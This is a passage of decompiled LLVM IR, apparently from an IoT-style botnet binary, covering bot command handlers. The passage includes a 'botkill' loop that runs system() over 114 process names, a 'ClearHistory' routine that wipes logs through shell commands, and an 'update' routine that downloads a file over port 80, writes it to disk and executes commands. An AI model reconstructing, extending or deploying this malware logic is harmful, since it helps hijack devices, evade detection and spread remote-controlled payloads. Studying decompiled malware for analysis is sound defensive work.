  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 98708, i32* %stack_var_-4, align 4
  %v2_18190 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_18190, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-32, align 4
  %v5_181b0 = icmp sgt i32 %arg3, 0
  br i1 %v5_181b0, label %dec_label_pc_181c8, label %dec_label_pc_181b4

dec_label_pc_181b4:                               ; preds = %entry
  store i32 %arg2, i32* @r2, align 4
  %v3_181c0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_388a0.844 to i32))
  br label %dec_label_pc_18374

dec_label_pc_181c8:                               ; preds = %entry
  %v1_181cc = add i32 %arg4, 4
  %v1_181d0 = inttoptr i32 %v1_181cc to i32*
  %v2_181d0 = load i32, i32* %v1_181d0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_3876c.822 to i32), i32* @r1, align 4
  %v3_181dc = inttoptr i32 %v2_181d0 to i8*
  %v4_181dc = call i32 @__GI_strcoll(i8* %v3_181dc, i32 ptrtoint ([3 x i8]* @global_var_3876c.822 to i32))
  %v2_181e4 = icmp eq i32 %v4_181dc, 0
  br i1 %v2_181e4, label %dec_label_pc_18210, label %dec_label_pc_181ec

dec_label_pc_181ec:                               ; preds = %dec_label_pc_181c8
  %v3_181ec = load i32, i32* %stack_var_-32, align 4
  %v1_181f0 = add i32 %v3_181ec, 4
  %v1_181f4 = inttoptr i32 %v1_181f0 to i32*
  %v2_181f4 = load i32, i32* %v1_181f4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_38770.824 to i32), i32* @r1, align 4
  %v3_18200 = inttoptr i32 %v2_181f4 to i8*
  %v4_18200 = call i32 @__GI_strcoll(i8* %v3_18200, i32 ptrtoint ([3 x i8]* @global_var_38770.824 to i32))
  %v2_18208 = icmp eq i32 %v4_18200, 0
  br i1 %v2_18208, label %dec_label_pc_18210, label %dec_label_pc_1828c

dec_label_pc_18210:                               ; preds = %dec_label_pc_181ec, %dec_label_pc_181c8
  %v2_18214 = load i32, i32* @global_var_49b34.817, align 4
  %v2_18218 = icmp eq i32 %v2_18214, 0
  br i1 %v2_18218, label %dec_label_pc_18220, label %dec_label_pc_18270

dec_label_pc_18220:                               ; preds = %dec_label_pc_18210
  %v1_18224 = call i32 @HeilHitler(i32 %arg1)
  %v2_1822c = load i32, i32* @global_var_49b34.817, align 4
  %v2_18230 = icmp eq i32 %v2_1822c, 0
  %v2_18258 = load i32, i32* @global_var_53710.671, align 4
  br i1 %v2_18230, label %dec_label_pc_18254, label %dec_label_pc_18238

dec_label_pc_18238:                               ; preds = %dec_label_pc_18220
  store i32 %v2_18258, i32* @r2, align 4
  %v3_1824c = call i32 @Send(i32 %arg1, i32 ptrtoint ([42 x i8]* @global_var_388bc.850 to i32))
  br label %dec_label_pc_18374

dec_label_pc_18254:                               ; preds = %dec_label_pc_18220
  store i32 %v2_18258, i32* @r2, align 4
  %v3_18268 = call i32 @Send(i32 %arg1, i32 ptrtoint ([50 x i8]* @global_var_388e8.852 to i32))
  br label %dec_label_pc_18374

dec_label_pc_18270:                               ; preds = %dec_label_pc_18210
  %v2_18274 = load i32, i32* @global_var_53710.671, align 4
  store i32 %v2_18274, i32* @r2, align 4
  %v3_18284 = call i32 @Send(i32 %arg1, i32 ptrtoint ([50 x i8]* @global_var_3891c.854 to i32))
  br label %dec_label_pc_18374

dec_label_pc_1828c:                               ; preds = %dec_label_pc_181ec
  %v3_1828c = load i32, i32* %stack_var_-32, align 4
  %v1_18290 = add i32 %v3_1828c, 4
  %v1_18294 = inttoptr i32 %v1_18290 to i32*
  %v2_18294 = load i32, i32* %v1_18294, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_38808.834 to i32), i32* @r1, align 4
  %v3_182a0 = inttoptr i32 %v2_18294 to i8*
  %v4_182a0 = call i32 @__GI_strcoll(i8* %v3_182a0, i32 ptrtoint ([4 x i8]* @global_var_38808.834 to i32))
  %v2_182a8 = icmp eq i32 %v4_182a0, 0
  br i1 %v2_182a8, label %dec_label_pc_182d4, label %dec_label_pc_182b0

dec_label_pc_182b0:                               ; preds = %dec_label_pc_1828c
  %v3_182b0 = load i32, i32* %stack_var_-32, align 4
  %v1_182b4 = add i32 %v3_182b0, 4
  %v1_182b8 = inttoptr i32 %v1_182b4 to i32*
  %v2_182b8 = load i32, i32* %v1_182b8, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_3880c.836 to i32), i32* @r1, align 4
  %v3_182c4 = inttoptr i32 %v2_182b8 to i8*
  %v4_182c4 = call i32 @__GI_strcoll(i8* %v3_182c4, i32 ptrtoint ([4 x i8]* @global_var_3880c.836 to i32))
  %v2_182cc = icmp eq i32 %v4_182c4, 0
  br i1 %v2_182cc, label %dec_label_pc_182d4, label %dec_label_pc_18364

dec_label_pc_182d4:                               ; preds = %dec_label_pc_182b0, %dec_label_pc_1828c
  %v2_182d8 = load i32, i32* @global_var_49b34.817, align 4
  %v2_182dc = icmp eq i32 %v2_182d8, 0
  br i1 %v2_182dc, label %dec_label_pc_18348, label %dec_label_pc_182e4

dec_label_pc_182e4:                               ; preds = %dec_label_pc_182d4
  %v2_182f4 = call i32 @kill(i32 %v2_182d8, i32 9)
  %v2_182fc = icmp eq i32 %v2_182f4, 0
  %v2_18308 = load i32, i32* @global_var_53710.671, align 4
  br i1 %v2_182fc, label %dec_label_pc_18304, label %dec_label_pc_1832c

dec_label_pc_18304:                               ; preds = %dec_label_pc_182e4
  store i32 %v2_18308, i32* @r2, align 4
  %v3_18318 = call i32 @Send(i32 %arg1, i32 ptrtoint ([41 x i8]* @global_var_38950.858 to i32))
  store i32 0, i32* @global_var_49b34.817, align 4
  br label %dec_label_pc_18374

dec_label_pc_1832c:                               ; preds = %dec_label_pc_182e4
  store i32 %v2_18308, i32* @r2, align 4
  %v3_18340 = call i32 @Send(i32 %arg1, i32 ptrtoint ([49 x i8]* @global_var_3897c.860 to i32))
  br label %dec_label_pc_18374

dec_label_pc_18348:                               ; preds = %dec_label_pc_182d4
  %v2_1834c = load i32, i32* @global_var_53710.671, align 4
  store i32 %v2_1834c, i32* @r2, align 4
  %v3_1835c = call i32 @Send(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_389b0.862 to i32))
  br label %dec_label_pc_18374

dec_label_pc_18364:                               ; preds = %dec_label_pc_182b0
  store i32 %arg2, i32* @r2, align 4
  %v3_18370 = call i32 @Send(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_388a0.844 to i32))
  br label %dec_label_pc_18374

dec_label_pc_18374:                               ; preds = %dec_label_pc_18348, %dec_label_pc_1832c, %dec_label_pc_18304, %dec_label_pc_18270, %dec_label_pc_18254, %dec_label_pc_18238, %dec_label_pc_181b4, %dec_label_pc_18364
  %v1_1837c = phi i32 [ %v3_1835c, %dec_label_pc_18348 ], [ %v3_18340, %dec_label_pc_1832c ], [ %v3_18318, %dec_label_pc_18304 ], [ %v3_18284, %dec_label_pc_18270 ], [ %v3_18268, %dec_label_pc_18254 ], [ %v3_1824c, %dec_label_pc_18238 ], [ %v3_181c0, %dec_label_pc_181b4 ], [ %v3_18370, %dec_label_pc_18364 ]
  ret i32 %v1_1837c

; uselistorder directives
  uselistorder i32 %v2_18258, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_3880c.836 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_38808.834 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_38770.824 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_3876c.822 to i32), { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 4, 3, 2, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_18374, { 7, 0, 1, 2, 3, 4, 5, 6 }
}

define i32 @botkill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-532 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 99264, i32* %stack_var_-4, align 4
  %v2_183bc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_183bc, i32* @fp, align 4
  %v0_183c4 = call i32 @fork()
  %v2_183cc = icmp eq i32 %v0_183c4, 0
  br i1 %v2_183cc, label %dec_label_pc_18470, label %dec_label_pc_183d4.preheader

dec_label_pc_183d4.preheader:                     ; preds = %entry
  %v2_1841c = ptrtoint i32* %stack_var_-532 to i32
  br label %dec_label_pc_183e0.lr.ph

dec_label_pc_183e0.lr.ph:                         ; preds = %dec_label_pc_183e0, %dec_label_pc_183d4.preheader
  br label %dec_label_pc_183e0

dec_label_pc_183e0:                               ; preds = %dec_label_pc_183e0.lr.ph, %dec_label_pc_183e0
  %storemerge15 = phi i32 [ 0, %dec_label_pc_183e0.lr.ph ], [ %v1_18458, %dec_label_pc_183e0 ]
  %v4_183e8 = mul i32 %storemerge15, 4
  %v5_183e8 = add i32 %v4_183e8, ptrtoint ([114 x i8*]* @global_var_44af0.864 to i32)
  %v6_183e8 = inttoptr i32 %v5_183e8 to i32*
  %v7_183e8 = load i32, i32* %v6_183e8, align 4
  store i32 %v7_183e8, i32* @lr, align 4
  store i32 %v2_1841c, i32* @r0, align 4
  %v4_1843c = call i32 @sprintf(i32 %v2_1841c, i32 ptrtoint ([123 x i8]* @global_var_389e0.866 to i32), i32 %v7_183e8)
  %v1_18448 = call i32 @system(i32 %v2_1841c)
  %v1_18450 = call i32 @sleep(i32 1)
  %v1_18458 = add i32 %storemerge15, 1
  %tmp = icmp ult i32 %v1_18458, 114
  br i1 %tmp, label %dec_label_pc_183e0, label %dec_label_pc_183e0.lr.ph

dec_label_pc_18470:                               ; preds = %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v7_183e8, { 1, 0 }
  uselistorder i32 %storemerge15, { 1, 0 }
  uselistorder i32 %v2_1841c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_183e0, { 1, 0 }
}

define i32 @ClearHistory() local_unnamed_addr {
entry:
  %v3_18488 = load i32, i32* @fp, align 4
  %v2_18494 = call i32 @system(i32 ptrtoint ([22 x i8]* @global_var_38a5c.868 to i32))
  %v2_1849c = call i32 @system(i32 ptrtoint ([29 x i8]* @global_var_38a74.870 to i32))
  %v2_184a4 = call i32 @system(i32 ptrtoint ([21 x i8]* @global_var_38a94.872 to i32))
  store i32 %v3_18488, i32* @fp, align 4
  ret i32 %v2_184a4
}

define i32 @dns2ip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 99532, i32* %stack_var_-4, align 4
  %v2_184c8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_184c8, i32* @fp, align 4
  %v1_184e4 = call i32 @mfork(i32 %arg2)
  %v2_184ec = icmp eq i32 %v1_184e4, 0
  br i1 %v2_184ec, label %dec_label_pc_184f4, label %dec_label_pc_18584

dec_label_pc_184f4:                               ; preds = %entry
  %v7_184f8 = icmp eq i32 %arg3, 1
  br i1 %v7_184f8, label %dec_label_pc_18500, label %dec_label_pc_1856c

dec_label_pc_18500:                               ; preds = %dec_label_pc_184f4
  %v1_18504 = add i32 %arg4, 4
  %v1_18508 = inttoptr i32 %v1_18504 to i32*
  %v2_18508 = load i32, i32* %v1_18508, align 4
  store i32 %v2_18508, i32* @r0, align 4
  %v1_18510 = call i32 @__GI_gethostbyname(i32 %v2_18508)
  %v1_18518 = add i32 %v1_18510, 16
  %v2_18518 = inttoptr i32 %v1_18518 to i32*
  %v3_18518 = load i32, i32* %v2_18518, align 4
  %v1_1851c = inttoptr i32 %v3_18518 to i32*
  %v2_1851c = load i32, i32* %v1_1851c, align 4
  %v1_18520 = inttoptr i32 %v2_1851c to i32*
  %v2_18520 = load i32, i32* %v1_18520, align 4
  store i32 %v2_18520, i32* @r0, align 4
  %v1_18524 = call i32 @__GI_inet_ntoa(i32 %v2_18520)
  %v2_1852c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v1_18524, i32* @r1, align 4
  %v2_1853c = call i32 @strncpy(i32 %v2_1852c, i32 %v1_18524)
  store i32 %arg2, i32* @r2, align 4
  %v3_18564 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_38aac.874 to i32))
  br label %dec_label_pc_1857c

dec_label_pc_1856c:                               ; preds = %dec_label_pc_184f4
  store i32 %arg2, i32* @r2, align 4
  %v3_18578 = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_38acc.876 to i32))
  br label %dec_label_pc_1857c

dec_label_pc_1857c:                               ; preds = %dec_label_pc_18500, %dec_label_pc_1856c
  %v1_18580 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_18584

dec_label_pc_18584:                               ; preds = %entry, %dec_label_pc_1857c
  %v1_1858c = phi i32 [ %v1_184e4, %entry ], [ %v1_18580, %dec_label_pc_1857c ]
  ret i32 %v1_1858c

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 1, 0 }
  uselistorder label %dec_label_pc_18584, { 1, 0 }
  uselistorder label %dec_label_pc_1857c, { 1, 0 }
}

define i32 @update(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-5240 = alloca i32, align 4
  %stack_var_-1144 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 99748, i32* %stack_var_-4, align 4
  %v2_185a0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_185a0, i32* @fp, align 4
  %v2_185b4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 -5228, i32* %r1.global-to-local, align 4
  store i32 %v2_185b4, i32* @lr, align 4
  store i32 %v2_185b4, i32* @r0, align 4
  %v0_185ec = call i32 @__GI_getpid()
  store i32 %v2_185b4, i32* %r1.global-to-local, align 4
  %v1_18608 = call i32 @mfork(i32 %arg2)
  %v2_18610 = icmp eq i32 %v1_18608, 0
  br i1 %v2_18610, label %dec_label_pc_18618, label %dec_label_pc_190dc

dec_label_pc_18618:                               ; preds = %entry
  %v8_1862c = icmp sgt i32 %arg3, 1
  br i1 %v8_1862c, label %dec_label_pc_18660, label %dec_label_pc_18630

dec_label_pc_18630:                               ; preds = %dec_label_pc_18618
  store i32 ptrtoint ([40 x i8]* @global_var_38ae8.878 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_185b4, i32* @lr, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_18654 = call i32 @Send(i32 %arg1, i32 ptrtoint ([40 x i8]* @global_var_38ae8.878 to i32))
  %v1_1865c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_18660

dec_label_pc_18660:                               ; preds = %dec_label_pc_18618, %dec_label_pc_18630
  store i32 1, i32* %r1.global-to-local, align 4
  %v3_1866c = call i32 @socket(i32 2, i32 1, i32 0)
  %v3_1867c = icmp eq i32 %v3_1866c, -1
  br i1 %v3_1867c, label %dec_label_pc_18684, label %dec_label_pc_186b4

dec_label_pc_18684:                               ; preds = %dec_label_pc_18660
  store i32 ptrtoint ([96 x i8]* @global_var_38b10.880 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_186a8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([96 x i8]* @global_var_38b10.880 to i32))
  %v1_186b0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_186b4

dec_label_pc_186b4:                               ; preds = %dec_label_pc_18660, %dec_label_pc_18684
  store i32 2, i32* %stack_var_-120, align 4
  %v1_186c0 = call i32 @__GI_htons(i32 80)
  store i32 %v2_185b4, i32* @ip, align 4
  %v1_186dc = add i32 %arg4, 4
  %v1_186e0 = inttoptr i32 %v1_186dc to i32*
  %v2_186e0 = load i32, i32* %v1_186e0, align 4
  store i32 %v2_186e0, i32* @r0, align 4
  %v1_186e8 = call i32 @inet_addr(i32 %v2_186e0)
  %v3_186f8 = icmp eq i32 %v1_186e8, -1
  br i1 %v3_186f8, label %dec_label_pc_18700, label %dec_label_pc_18790

dec_label_pc_18700:                               ; preds = %dec_label_pc_186b4
  store i32 %v2_185b4, i32* @lr, align 4
  %v2_18714 = load i32, i32* %v1_186e0, align 4
  store i32 %v2_18714, i32* @r0, align 4
  %v1_1871c = call i32 @__GI_gethostbyname(i32 %v2_18714)
  %v2_1872c = icmp eq i32 %v1_1871c, 0
  br i1 %v2_1872c, label %dec_label_pc_18734, label %dec_label_pc_18764

dec_label_pc_18734:                               ; preds = %dec_label_pc_18700
  store i32 ptrtoint ([39 x i8]* @global_var_36b60.63 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_18758 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_36b60.63 to i32))
  %v1_18760 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_18764

dec_label_pc_18764:                               ; preds = %dec_label_pc_18700, %dec_label_pc_18734
  %v1_18768 = add i32 %v1_1871c, 16
  %v2_18768 = inttoptr i32 %v1_18768 to i32*
  %v3_18768 = load i32, i32* %v2_18768, align 4
  %v1_1876c = inttoptr i32 %v3_18768 to i32*
  %v2_1876c = load i32, i32* %v1_1876c, align 4
  store i32 %v2_1876c, i32* @r1, align 4
  %v1_18774 = add i32 %v1_1871c, 12
  %v2_18774 = inttoptr i32 %v1_18774 to i32*
  %v3_18774 = load i32, i32* %v2_18774, align 4
  store i32 %v3_18774, i32* @r2, align 4
  %v2_18780 = ptrtoint i32* %stack_var_-116 to i32
  store i32 %v2_18780, i32* @r3, align 4
  store i32 %v2_18780, i32* @r0, align 4
  %v0_18788 = call i32 @memcpy()
  br label %dec_label_pc_18798

dec_label_pc_18790:                               ; preds = %dec_label_pc_186b4
  store i32 %v1_186e8, i32* %stack_var_-116, align 4
  br label %dec_label_pc_18798

dec_label_pc_18798:                               ; preds = %dec_label_pc_18764, %dec_label_pc_18790
  %v2_1879c = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v2_1879c, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 8, i32* @r2, align 4
  %v0_187ac = call i32 @__GI_memset()
  %v2_187b0 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_187b0, i32* %r1.global-to-local, align 4
  %v3_187c0 = call i32 @connect(i32 %v3_1866c, i32 %v2_187b0, i32 16)
  %v2_187c8 = icmp eq i32 %v3_187c0, 0
  br i1 %v2_187c8, label %dec_label_pc_18800, label %dec_label_pc_187d0

dec_label_pc_187d0:                               ; preds = %dec_label_pc_18798
  store i32 ptrtoint ([39 x i8]* @global_var_36b88.65 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_185b4, i32* @lr, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_187f4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_36b88.65 to i32))
  %v1_187fc = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_18800

dec_label_pc_18800:                               ; preds = %dec_label_pc_18798, %dec_label_pc_187d0
  store i32 ptrtoint ([2 x i8]* @global_var_37118.168 to i32), i32* %r1.global-to-local, align 4
  %v4_18808 = call i32 @popen(i32 ptrtoint ([11 x i8]* @global_var_38b70.884 to i32), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_37118.168, i32 0, i32 0))
  %v2_18818 = icmp eq i32 %v4_18808, 0
  br i1 %v2_18818, label %dec_label_pc_18890, label %dec_label_pc_18820

dec_label_pc_18820:                               ; preds = %dec_label_pc_18800
  %v2_18824 = ptrtoint i32* %stack_var_-1144 to i32
  store i32 %v2_18824, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  %v0_18834 = call i32 @__GI_memset()
  store i32 1024, i32* %r1.global-to-local, align 4
  %v3_1884c = call i32 @fgets(i32 %v2_18824, i32 1024, i32 %v4_18808)
  store i32 ptrtoint ([6 x i8]* @global_var_38b7c.887 to i32), i32* %r1.global-to-local, align 4
  %v8_18860 = call i32 @strstr(i32 %v2_18824, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_38b7c.887, i32 0, i32 0), i32 %v4_18808, i32 %v2_18824, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v2_18868 = icmp ne i32 %v8_18860, 0
  %.19 = zext i1 %v2_18868 to i8
  %v1_18888 = call i32 @pclose(i32 %v4_18808)
  br label %dec_label_pc_188b0.preheader

dec_label_pc_18890:                               ; preds = %dec_label_pc_18800
  br label %dec_label_pc_188b0.preheader

dec_label_pc_188b0.preheader:                     ; preds = %dec_label_pc_18820, %dec_label_pc_18890
  %stack_var_-85.0.ph = phi i8 [ %.19, %dec_label_pc_18820 ], [ 0, %dec_label_pc_18890 ]
  %v1_188c4 = add i32 %arg4, 8
  %v1_188c8 = inttoptr i32 %v1_188c4 to i32*
  br label %dec_label_pc_188b0

dec_label_pc_188a4:                               ; preds = %dec_label_pc_188e0
  %v1_188a8 = add i32 %storemerge11, 1
  br label %dec_label_pc_188b0

dec_label_pc_188b0:                               ; preds = %dec_label_pc_188b0.preheader, %dec_label_pc_188a4
  %storemerge11 = phi i32 [ %v1_188a8, %dec_label_pc_188a4 ], [ 0, %dec_label_pc_188b0.preheader ]
  store i32 %storemerge11, i32* @r4, align 4
  %v2_188c8 = load i32, i32* %v1_188c8, align 4
  %v1_188cc = inttoptr i32 %v2_188c8 to i8*
  %v3_188d0 = call i32 @strlen(i8* %v1_188cc)
  %v0_188d8 = load i32, i32* @r4, align 4
  %v3_188d8 = icmp ult i32 %v0_188d8, %v3_188d0
  br i1 %v3_188d8, label %dec_label_pc_188e0, label %dec_label_pc_1890c

dec_label_pc_188e0:                               ; preds = %dec_label_pc_188b0
  store i32 %v2_185b4, i32* %r1.global-to-local, align 4
  %v2_188f4 = load i32, i32* %v1_188c8, align 4
  %v2_188fc = add i32 %v2_188f4, %storemerge11
  %v1_18900 = inttoptr i32 %v2_188fc to i8*
  %v2_18900 = load i8, i8* %v1_18900, align 1
  %v7_18904 = icmp eq i8 %v2_18900, 58
  br i1 %v7_18904, label %dec_label_pc_1890c, label %dec_label_pc_188a4

dec_label_pc_1890c:                               ; preds = %dec_label_pc_188b0, %dec_label_pc_188e0
  %v2_18920 = load i32, i32* %v1_188c8, align 4
  %v2_18928 = add i32 %v2_18920, %storemerge11
  %v3_18930 = inttoptr i32 %v2_18928 to i8*
  store i8 0, i8* %v3_18930, align 1
  %v2_18938 = icmp eq i8 %stack_var_-85.0.ph, 0
  br i1 %v2_18938, label %dec_label_pc_18960, label %dec_label_pc_18940

dec_label_pc_18940:                               ; preds = %dec_label_pc_1890c
  %v2_18954 = load i32, i32* %v1_188c8, align 4
  br label %dec_label_pc_18988

dec_label_pc_18960:                               ; preds = %dec_label_pc_1890c
  store i32 %v2_185b4, i32* @lr, align 4
  %v2_18974 = load i32, i32* %v1_188c8, align 4
  %v2_1897c = add i32 %storemerge11, 1
  %v1_18980 = add i32 %v2_1897c, %v2_18974
  br label %dec_label_pc_18988

dec_label_pc_18988:                               ; preds = %dec_label_pc_18940, %dec_label_pc_18960
  %storemerge12 = phi i32 [ %v2_18954, %dec_label_pc_18940 ], [ %v1_18980, %dec_label_pc_18960 ]
  store i32 ptrtoint ([276 x i8]* @global_var_36bb0.67 to i32), i32* %r1.global-to-local, align 4
  store i32 %storemerge12, i32* @r2, align 4
  %v3_189ac = call i32 @Send(i32 %v3_1866c, i32 ptrtoint ([276 x i8]* @global_var_36bb0.67 to i32))
  store i32 ptrtoint ([30 x i8]* @global_var_38b84.890 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_189d4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_38b84.890 to i32))
  %v2_189dc = call i32 @system(i32 ptrtoint ([11 x i8]* @global_var_38ba4.892 to i32))
  br i1 %v2_18938, label %dec_label_pc_18d4c, label %dec_label_pc_189ec

dec_label_pc_189ec:                               ; preds = %dec_label_pc_18988
  store i32 ptrtoint ([8 x i8]* @global_var_38bb0.894 to i32), i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_36ce0.71 to i32), i32* @r1, align 4
  %v4_189f4 = call i32 @__GI_fopen(i32 ptrtoint ([8 x i8]* @global_var_38bb0.894 to i32), i32 ptrtoint ([3 x i8]* @global_var_36ce0.71 to i32))
  %v2_18a08 = ptrtoint i32* %stack_var_-5240 to i32
  br label %dec_label_pc_18a00

dec_label_pc_18a00:                               ; preds = %dec_label_pc_18b94, %dec_label_pc_189ec
  store i32 %v2_18a08, i32* %r1.global-to-local, align 4
  %v4_18a1c = call i32 @recv(i32 %v3_1866c, i32 %v2_18a08, i32 4096, i32 0)
  %tmp89 = icmp slt i32 %v4_18a1c, 1
  br i1 %tmp89, label %dec_label_pc_18bb4.preheader.loopexit21, label %dec_label_pc_18a34

dec_label_pc_18a34:                               ; preds = %dec_label_pc_18a00
  %v8_18a44 = icmp sgt i32 %v4_18a1c, 4095
  br i1 %v8_18a44, label %dec_label_pc_18a74.lr.ph, label %dec_label_pc_18a48

dec_label_pc_18a48:                               ; preds = %dec_label_pc_18a34
  %v2_18a5c = add i32 %v4_18a1c, %v2_18a08
  %v3_18a64 = inttoptr i32 %v2_18a5c to i8*
  store i8 0, i8* %v3_18a64, align 1
  br label %dec_label_pc_18a74.lr.ph

dec_label_pc_18a74.lr.ph:                         ; preds = %dec_label_pc_18a48, %dec_label_pc_18a34
  br label %dec_label_pc_18a74

dec_label_pc_18a74:                               ; preds = %dec_label_pc_18a74.lr.ph, %dec_label_pc_18b94
  %storemerge13160 = phi i32 [ 0, %dec_label_pc_18a74.lr.ph ], [ %v1_18b98, %dec_label_pc_18b94 ]
  %v2_18a88 = add i32 %storemerge13160, %v2_18a08
  store i32 ptrtoint ([5 x i8]* @global_var_36ce4.73 to i32), i32* @r1, align 4
  %v4_18a98 = inttoptr i32 %v2_18a88 to i8*
  %v5_18a98 = call i32 @__GI_strncmp(i8* %v4_18a98, i32 ptrtoint ([5 x i8]* @global_var_36ce4.73 to i32), i32 4)
  %v2_18aa0 = icmp eq i32 %v5_18a98, 0
  br i1 %v2_18aa0, label %dec_label_pc_18aa8, label %dec_label_pc_18b94

dec_label_pc_18aa8:                               ; preds = %dec_label_pc_18a74
  %v1_18aac = add i32 %storemerge13160, 4
  %v1_18ac4 = add i32 %v4_189f4, 52
  %v2_18ac4 = inttoptr i32 %v1_18ac4 to i32*
  %v1_18ad4 = add i32 %v4_189f4, 16
  %v2_18ad4 = inttoptr i32 %v1_18ad4 to i32*
  %v1_18adc = add i32 %v4_189f4, 28
  %v2_18adc = inttoptr i32 %v1_18adc to i32*
  %v5_18b8c149 = icmp slt i32 %v1_18aac, %v4_18a1c
  br i1 %v5_18b8c149, label %dec_label_pc_18ab8, label %dec_label_pc_18bb4.preheader

dec_label_pc_18ab8:                               ; preds = %dec_label_pc_18aa8, %dec_label_pc_18b74
  %storemerge14150 = phi i32 [ %v1_18b78, %dec_label_pc_18b74 ], [ %v1_18aac, %dec_label_pc_18aa8 ]
  %v3_18ac4 = load i32, i32* %v2_18ac4, align 4
  %v2_18ac8 = icmp eq i32 %v3_18ac4, 0
  br i1 %v2_18ac8, label %dec_label_pc_18b4c, label %dec_label_pc_18ad0

dec_label_pc_18ad0:                               ; preds = %dec_label_pc_18ab8
  %v3_18ad4 = load i32, i32* %v2_18ad4, align 4
  %v3_18adc = load i32, i32* %v2_18adc, align 4
  %v3_18ae0 = icmp ult i32 %v3_18ad4, %v3_18adc
  br i1 %v3_18ae0, label %dec_label_pc_18ae8, label %dec_label_pc_18b20

dec_label_pc_18ae8:                               ; preds = %dec_label_pc_18ad0
  %v3_18aec = load i32, i32* %v2_18ad4, align 4
  store i32 %v3_18aec, i32* %r1.global-to-local, align 4
  store i32 %v2_185b4, i32* @lr, align 4
  %v2_18b04 = add i32 %storemerge14150, %v2_18a08
  %v1_18b08 = inttoptr i32 %v2_18b04 to i8*
  %v2_18b08 = load i8, i8* %v1_18b08, align 1
  %v3_18b0c = inttoptr i32 %v3_18aec to i8*
  store i8 %v2_18b08, i8* %v3_18b0c, align 1
  %v0_18b10 = load i32, i32* %r1.global-to-local, align 4
  %v1_18b10 = add i32 %v0_18b10, 1
  store i32 %v1_18b10, i32* %v2_18ad4, align 4
  br label %dec_label_pc_18b74

dec_label_pc_18b20:                               ; preds = %dec_label_pc_18ad0
  %v2_18b34 = add i32 %storemerge14150, %v2_18a08
  %v1_18b38 = inttoptr i32 %v2_18b34 to i8*
  %v2_18b38 = load i8, i8* %v1_18b38, align 1
  store i32 %v4_189f4, i32* %r1.global-to-local, align 4
  %v3_18b44 = call i32 @putc_unlocked(i8 %v2_18b38, i32 %v4_189f4)
  br label %dec_label_pc_18b74

dec_label_pc_18b4c:                               ; preds = %dec_label_pc_18ab8
  store i32 %v2_185b4, i32* %r1.global-to-local, align 4
  %v2_18b60 = add i32 %storemerge14150, %v2_18a08
  %v1_18b64 = inttoptr i32 %v2_18b60 to i8*
